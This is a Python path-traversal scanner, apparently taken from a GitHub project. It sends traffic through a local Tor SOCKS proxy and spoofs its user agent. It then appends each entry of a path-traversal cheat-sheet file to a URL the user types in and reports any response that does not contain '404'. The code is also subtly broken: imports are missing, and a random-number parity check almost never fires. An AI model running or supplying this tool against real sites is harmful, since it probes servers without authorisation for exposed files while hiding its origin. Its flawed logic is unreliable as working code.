# Reference: https://github.com/claudialorusso/pathtraversal/blob/master/pathtraversal.py
# Date: Mar 31, 2022

session = requests.session()
session.proxies = {}

r = session.get("http://httpbin.org/ip")

session = requests.session()
session.proxies = {}

session.proxies["http"] = "socks5h://localhost:9050"
session.proxies["https"] = "socks5h://localhost:9050"

r = session.get("http://httpbin.org/ip")

r = session.get("https://httpbin.org/user-agent")

headers = {}
headers['User-agent'] = "HotJava/1.1.2 FCS"

r = session.get("https://httpbin.org/user-agent", headers=headers)

session.get('http://httpbin.org/cookies/set/sessioncookie/Hello')
r = session.get("http://httpbin.org/cookies")

session.cookies.clear()
r = session.get("http://httpbin.org/cookies")

url_input = input("Enter URL:\t")

with open ("pathtraversal_cheatsheet") as f:
    cheat_sheet = f.readlines()

n = random.random()
if n%2 == 0:
    cheat_sheet.reverse()

i = 0
for cheat in cheat_sheet:
    try:
        url = url_input + cheat.replace("/", "%2F")
        r = session.get(url)
        if not re.search("404", r.text):
            exit = input("Continue?\t")
            if (exit != "Y" and exit != "Yes" and exit != "yes" and exit != "y"):
                break
            time.sleep(0.5)
        i+=1
    except requests.exceptions.HTTPError as notfound:
        break
    except requests.exceptions.MissingSchema as missingschema:
        break
    except requests.exceptions.ConnectionError as nohost:
        break

